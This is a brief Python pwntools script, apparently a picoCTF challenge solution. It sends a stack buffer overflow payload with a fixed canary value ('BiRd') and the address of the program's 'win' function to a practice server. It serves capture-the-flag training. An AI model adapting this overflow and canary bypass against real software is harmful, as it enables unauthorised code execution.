#!python3
from pwn import *
#connect saturn.picoctf.net 50975
elf = ELF("./vuln")
r = remote('saturn.picoctf.net', 50632)
r.recv()
r.sendline(b'88')
r.recv()
r.sendline(b'a'*64 + b'BiRd' + b'a'*16 + p32(elf.symbols.win))
print(elf.symbols.win)
r.interactive()